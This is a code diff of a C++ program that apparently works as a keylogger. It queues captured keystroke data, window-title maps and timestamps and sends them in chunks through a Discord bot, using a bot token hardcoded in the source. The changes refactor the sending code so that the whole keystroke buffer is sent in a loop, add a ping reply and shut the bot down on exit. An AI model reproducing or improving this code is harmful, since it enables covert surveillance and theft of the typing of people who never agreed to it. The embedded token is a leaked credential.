@@ -35,8 +35,6 @@ const std::string    BOT_TOKEN    = "Nzk1MjgzNjM2MDg1MzI1ODI1.GJQ65H.orWw99qm-DP
 class my_string {
 	std::string* vec, * temp, ** head;
 	const int __reserve_size = 100000;
-	//std::mutex __mtex;
-	//bool islock = false;
 
 	void init() {
 		vec = new std::string();
@@ -92,7 +90,7 @@ public:
 		(*head)->operator+=(element);
 	}
 
-	std::string get(size_t size = 2000) {
+	std::string get(size_t size) {
 		return vec->substr(0, size);
 	}
 
@@ -104,11 +102,9 @@ public:
 		return temp->size();
 	}
 
-	void try_erase(size_t size = 2000) {
+	void try_erase(size_t size) {
 		*head = temp;
-		// if(vec.size() != 0) {
 		vec->erase(0, size);
-		// }
 		vec->operator+=(*temp);
 		*head = vec;
 		temp->clear();
@@ -126,7 +122,6 @@ FILE* output_file, * dbg_file;
 my_string vecdata, queued_vecdata;	////////////////
 std::queue<my_string> keydata;
 
-// std::mutex sendkey_lock, sendmap_lock, sendtimeline_lock;
 std::mutex mx;
 std::condition_variable condvar;
 bool is_sendkey = false, is_sendtimestamp = false, is_sendmap = false;
@@ -174,11 +169,9 @@ inline void wide_char_to_mb(WCHAR* input, char* output, int outputbuf) {
 
 //experimental impl
 //communicate with discord
-//true if success, false otherwise
+//err is set to "ok!" if success, approriate error message if error(s) occured
 void send_data(const std::string& msg, std::string& err) {
-	// bool retval = true;
 	err = "ok!";
-	// other_option();
 
 	botmsg.set_content(msg);
 
@@ -197,7 +190,6 @@ void send_data(const std::string& msg, std::string& err) {
 void send_map(std::string& err) {
 	std::unique_lock<std::mutex> locker(mx);
 	while (is_sendtimestamp) condvar.wait(locker);
-	// is_sendmap = true;
 
 	err = "ok!";
 	for (auto& pp : queued_mapper) {
@@ -205,7 +197,6 @@ void send_map(std::string& err) {
 		snprintf(_buf, 500, ">%u %s", pp.second, pp.first.c_str());
 		std::string data(_buf);
 
-		// send_data(data, err, other_option);
 		send_data(data, err);
 	}
 
@@ -217,12 +208,10 @@ void send_map(std::string& err) {
 void send_timestamp(unsigned int id, time_t stamp, std::string& err) {
 	std::unique_lock<std::mutex> locker(mx);
 	while (is_sendkey) condvar.wait(locker);
-	// is_sendtimestamp = true;
 
 	char _buf[101];
 	snprintf(_buf, 100, "[%u %lld", id, stamp);
 	std::string data(_buf);
-	// send_data(data, err, other_option);
 	send_data(data, err);
 
 	is_sendtimestamp = false;
@@ -233,14 +222,19 @@ void send_timestamp(unsigned int id, time_t stamp, std::string& err) {
 void send_key(size_t len, std::string& err) {
 	std::unique_lock<std::mutex> locker(mx);
 	while (is_sendmap) condvar.wait(locker);
-	// is_sendkey = true;
 
 	size_t uselen = std::min(len, keydata.front().size());
-	std::string data = keydata.front().get(uselen);
-	keydata.front().try_erase(uselen);
-	// send_data(data, err, other_option);
-	send_data(data, err);
+	while(uselen != 0) {
+		std::string data = keydata.front().get(uselen);
+		keydata.front().try_erase(uselen);
 
+		send_data(data, err);
+		if(err != "ok!") {
+			goto sendkey_ret;
+		}
+	}
+
+	sendkey_ret:
 	is_sendkey = false;
 	condvar.notify_all();
 }
@@ -384,7 +378,9 @@ void botrun()
 			size_t issuing_user = event.command.get_issuing_user().id;
 			std::string issuing_command = event.command.get_command_name();
 			if (issuing_command == "ping") {
-                event.reply("Pong!");
+				char buffer[1001];
+				snprintf(buffer, 1000, "Pong! %f ms", bot->rest_ping);
+				event.reply(buffer);
 			}
 			if (issuing_command == "version") {
 				char buffer[1001];
@@ -453,6 +449,8 @@ int main() {
 
 	t2.join();
 	t1.join();
+
+	bot->shutdown();
 
 	fclose(output_file);
 	#ifdef MY_PROJ_DEBUG
